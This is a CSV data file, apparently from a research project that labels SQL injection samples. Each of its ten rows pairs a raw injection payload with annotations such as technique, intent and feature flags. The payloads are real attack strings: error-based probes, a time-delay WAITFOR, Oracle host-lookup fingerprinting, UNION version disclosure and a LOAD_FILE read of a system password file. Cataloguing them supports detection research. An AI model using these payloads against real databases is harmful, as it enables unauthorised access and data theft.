row_id,source_dataset,source_file,raw_label,raw_sql,sql_normalized,input_type,main_verb,target_tables,target_columns,initial_category,initial_impact,initial_intent,canonical_intent,attack_effect_initial,prompt_style,review_flag_unknown_verb,review_flag_empty_canonical_intent,review_flag_no_target_tables,review_flag_suspect_row,keep,dialect_guess,manual_category,manual_impact,manual_intent,target_table_canonical,prompt_domain_entity,expected_sql_operation,expected_security_violation,requires_sensitive_table,notes,semantic_category,semantic_impact,semantic_intent,semantic_canonical_intent,attack_technique,expected_security_violation.1,uses_union,uses_subquery,uses_stacked_query,uses_comment_termination,uses_time_function,uses_schema_enumeration,problematic_annotation,expected_missing_verb_for_fragment,expected_missing_table_for_fragment,review_flag_problematic_row,target_table_primary,target_num_prompts
7757,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-1385'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'mjjd'  =  'mjjd,-1385' ) ) ) OR 5903 = ( 'QQPJQ'|| ( SELECT CASE 5903 WHEN 5903 THEN 1 ELSE 0 END FROM RDB$DATABASE ) ||'QZVZQ' ) AND ( ( ( 'MJJD' = 'MJJD,injection_fragment,UNKNOWN,rdb,end,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,rdb,3
6491,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'  )   waitfor delay '0:0:5' and   (  'fpnh'  =  'fpnh,1' ) WAITFOR DELAY '0:0:5' AND ( 'FPNH' = 'FPNH,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,False,True,False,False,True,True,False,,3
90,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'","SELECT * FROM USERS WHERE ID = '1' UNION SELECT ( \ ) ,@@VERSION -- 1'",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data from users,union_based,confidentiality,True,True,False,True,False,True,False,False,False,False,users,3
203,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,AND 1 = UTL_INADDR.GET_HOST_ADDRESS ( ( SELECT SYS.LOGIN_USER FROM DUAL ) ) AND 'I' = 'I,injection_fragment,UNKNOWN,dual,login_user,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,fingerprinting_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
8020,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   as bvvl where 9818  =  9818 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --","1' ) AS BVVL WHERE 9818 = 9818 AND ( SELECT 9067 FROM ( SELECT COUNT ( * ) ,CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 9067 = 9067,1 ) ) ) ,0X717A767A71,FLOOR ( RAND ( 0 ) *2 ) ) X FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY X ) A ) --",injection_fragment,UNKNOWN,character_sets,9067,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,schema_enumeration_fragment,confidentiality,False,True,False,True,False,True,False,True,False,False,character_sets,3
740,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,select * from users where id  =  1 or \+<\ or 1  =  1 -- 1,SELECT * FROM USERS WHERE ID = 1 OR \+<\ OR 1 = 1 -- 1,full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
4655,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""cgpm"" like ""cgpm","1"" OR ROW ( 1045,7562 ) > ( SELECT COUNT ( * ) ,CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 1045 = 1045,1 ) ) ) ,0X717A767A71,FLOOR ( RAND ( 0 ) *2 ) ) X FROM ( SELECT 8488 UNION SELECT 5584 UNION SELECT 3051 UNION SELECT 1210 ) A GROUP BY X ) AND ""CGPM"" LIKE ""CGPM",injection_fragment,UNKNOWN,,0x717a767a71,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,union_based_fragment,confidentiality,True,True,False,False,False,False,False,True,True,False,,3
390,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1","SELECT * FROM USERS WHERE ID = 1 OR ""; ( "" OR 1 = 1 -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,stacked_query,confidentiality,False,False,True,True,False,False,False,False,False,False,users,3
40,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...","1; ( LOAD_FILE ( CHAR ( 47,101,116,99,47,112,97,115, ...",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,stacked_fragment,confidentiality,False,False,True,False,False,False,False,True,True,False,,3
3219,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'nvsy' like 'nvsy","1' ) ) AND 5556 = ( SELECT COUNT ( * ) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5 ) AND ( ( 'NVSY' LIKE 'NVSY",injection_fragment,UNKNOWN,all_users,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,all_users,3
